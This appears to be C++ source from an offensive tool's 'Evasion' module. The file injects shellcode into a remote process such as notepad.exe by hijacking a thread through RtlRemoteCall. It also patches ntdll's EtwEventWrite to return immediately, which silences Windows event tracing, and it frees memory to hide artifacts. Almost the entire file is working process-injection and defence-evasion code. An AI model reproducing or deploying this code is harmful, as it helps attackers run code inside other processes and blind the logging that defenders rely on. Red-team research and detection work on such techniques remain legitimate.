typedef BOOL (WINAPI * VirtualProtect_t)(LPVOID lpAddress,  SIZE_T dwSize, DWORD  flNewProtect,  PDWORD lpflOldProtect);
typedef BOOL (WINAPI * WriteProcessMemory_t)(HANDLE  hProcess, LPVOID  lpBaseAddress, LPCVOID lpBuffer, SIZE_T  nSize, SIZE_T  *lpNumberOfBytesWritten);


typedef struct _API_REMOTE_CALL 
{
	// remote API call return value
	size_t retval;
	
	// standard function to call at the end of the shellcode
	NtContinue_t ntContinue;
	CONTEXT	context;
	
	// remote function to call - adjust the types!
	VirtualProtect_t ARK_func1;
	PVOID address;
	SIZE_T size;
	DWORD newProtect;
	DWORD oldProtect;

	WriteProcessMemory_t ARK_func2;
	HANDLE process;
	char patch[10];	
	SIZE_T sizePatch; 
	SIZE_T numberOfBytesWritten;

} ApiReeKall;


void SHELLCODE(ApiReeKall * ark)
{
	size_t ret = (size_t) ark->ARK_func1(ark->address, ark->size, ark->newProtect, &ark->oldProtect);
	ret = (size_t) ark->ARK_func2(ark->process, ark->address, (void*)&ark->patch, ark->sizePatch, &ark->numberOfBytesWritten);
	ret = (size_t) ark->ARK_func1(ark->address, ark->size, ark->oldProtect, &ark->oldProtect);
	ark->retval = ret;
	ark->ntContinue(&ark->context, 0);
}
void SHELLCODE_END(void) {}


size_t MakeReeKall(HANDLE hProcess, HANDLE hThread, ApiReeKall ark) 
{
	char prolog[] = { 	0x49, 0x8b, 0xcc,   // mov rcx, r12
						0x49, 0x8b, 0xd5,	// mov rdx, r13
						0x4d, 0x8b, 0xc6,	// mov r8, r14
						0x4d, 0x8b, 0xcf	// mov r9, r15
					};
	int prolog_size = sizeof(prolog);
	
	// resolve needed API pointers
	RtlRemoteCall_t pRtlRemoteCall = (RtlRemoteCall_t) GetProcAddress(GetModuleHandle("ntdll.dll"), "RtlRemoteCall");
	NtContinue_t pNtContinue = (NtContinue_t) GetProcAddress(GetModuleHandle("ntdll.dll"), "NtContinue");
	
	if (pRtlRemoteCall == NULL || pNtContinue == NULL) 
		return -1;		

	// allocate some space in the target for our shellcode
	void * remote_mem = VirtualAllocEx(hProcess, 0, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (remote_mem == NULL) 
		return -1;
	
	// calculate the size of our shellcode
	size_t sc_size = (size_t) SHELLCODE_END - (size_t) SHELLCODE;

	size_t bOut = 0;
#ifdef _WIN64 
	// first, write prolog, if the process is 64-bit
	if (WriteProcessMemory(hProcess, remote_mem, prolog, prolog_size, (SIZE_T *) &bOut) == 0) 
	{
		VirtualFreeEx(hProcess, remote_mem, 0, MEM_RELEASE);
		return -1;
	}
#else
	// otherwise, ignore the prolog
	prolog_size = 0;
#endif

	// write the main payload
	if (WriteProcessMemory(hProcess, (char *) remote_mem + prolog_size, &SHELLCODE, sc_size, (SIZE_T *) &bOut) == 0) 
	{
		VirtualFreeEx(hProcess, remote_mem, 0, MEM_RELEASE);
		return -1;
	}
	
	// set remaining data in ApiReeKall struct - NtContinue with a thread context we're hijacking
	ark.retval = RETVAL_TAG;
	ark.ntContinue = pNtContinue;
	ark.context.ContextFlags = CONTEXT_FULL;
	SuspendThread(hThread);
	GetThreadContext(hThread, &ark.context);

	// prepare an argument to be passed to our shellcode
	ApiReeKall * ark_arg;
	ark_arg = (ApiReeKall  *) ((size_t) remote_mem + prolog_size + sc_size + ((size_t) remote_mem + prolog_size + sc_size)%0x10);		// align to 0x10
	if (WriteProcessMemory(hProcess, ark_arg, &ark, sizeof(ApiReeKall), 0) == 0) 
	{
		VirtualFreeEx(hProcess, remote_mem, 0, MEM_RELEASE);
		ResumeThread(hThread);
		return -1;		
	}
		
	NTSTATUS status = pRtlRemoteCall(hProcess, hThread, remote_mem, 1, (PULONG) &ark_arg, 1, 1);
	ResumeThread(hThread);

	// get the remote API call return value
	size_t ret = 0;
	while(TRUE) 
	{
		Sleep(1000);
		ReadProcessMemory(hProcess, ark_arg, &ret, sizeof(size_t), (SIZE_T *) &bOut);
		if (ret != RETVAL_TAG) 
			break;
	}
	
	// dealloc the shellcode memory to remove suspicious artifacts
	VirtualFreeEx(hProcess, remote_mem, 0, MEM_RELEASE);

	return ret;
}


int Evasion::remotePatch(std::string& result)
{
	bool isRemotePatchReeKall = false;
	bool isRemotePatchDirect = true;
	if(isRemotePatchReeKall)
	{
		std::string process = "notepad.exe";
		std::string moduleName = "ntdll.dll";
		std::string target = "EtwEventWrite";
		std::string patch = "\x48\x33\xc0\xc3";
		int offset = 0;

		DWORD pid = FindTarget(process.c_str());
		if (pid == 0) 
		{
			result += "Could not find target process.";
			return -1;		
		}
		
		DWORD tid = FindThreadID(pid);
		if (tid == 0) 
		{
			result += "Could not find a thread.";
			return -1;		
		}
		
		// open both process and thread in the remote target
		HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, pid);
		HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, 0, tid);
		if (hProcess == NULL || hThread == NULL) 
		{
			result += "Error opening remote process and thread.";
			return -1;		
		}

		// prepare patching ApiReeKall struct
		ApiReeKall ark = { 0 };
		ark.ARK_func1 = (VirtualProtect_t) GetProcAddress(LoadLibrary("kernel32.dll"), "VirtualProtect");
		FARPROC procAddress = GetProcAddress(LoadLibrary(moduleName.c_str()), target.c_str());
		ark.address = reinterpret_cast<BYTE*>(procAddress) + offset;
		ark.size = 1024;
		ark.newProtect = PAGE_READWRITE;
		ark.oldProtect = 0;

		ark.ARK_func2 = (WriteProcessMemory_t) GetProcAddress(LoadLibrary("kernel32.dll"), "WriteProcessMemory");
		ark.process = (HANDLE)-1;
		memcpy(ark.patch, patch.c_str(), patch.size());
		ark.sizePatch = patch.size();
		ark.numberOfBytesWritten = 0;
		
		size_t ret = MakeReeKall(hProcess, hThread, ark);
		if(ret==-1)
		{
			result += "Failed";
		}
		else
		{
			result += "Success";
		}
		
		// cleanup
		CloseHandle(hThread);
		CloseHandle(hProcess);
	}
	else if(isRemotePatchDirect)
	{
		std::string process = "notepad.exe";
		std::string moduleName = "ntdll.dll";
		std::string target = "EtwEventWrite";
		std::string patch = "\x48\x33\xc0\xc3";
		int offset = 0;

		DWORD pid = FindTarget(process.c_str());
		if (pid == 0) 
		{
			result += "Could not find target process.";
			return -1;		
		}
		
		DWORD tid = FindThreadID(pid);
		if (tid == 0) 
		{
			result += "Could not find a thread.";
			return -1;		
		}
		
		// open both process and thread in the remote target
		HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, pid);
		if (hProcess == NULL) 
		{
			result += "Error opening remote process and thread.";
			return -1;		
		}

		FARPROC procAddress = GetProcAddress(LoadLibrary(moduleName.c_str()), target.c_str());
		void* address = reinterpret_cast<BYTE*>(procAddress) + offset;

		DWORD oldprotect = 0;
		VirtualProtectEx(hProcess, address, 1024, PAGE_READWRITE, &oldprotect);
		
		WriteProcessMemory(hProcess, address, (PVOID)patch.c_str(), patch.size(), 0);

		VirtualProtectEx(hProcess, address, 1024, oldprotect, &oldprotect);
		
		CloseHandle(hProcess);
	}

	return 0;
}


#endif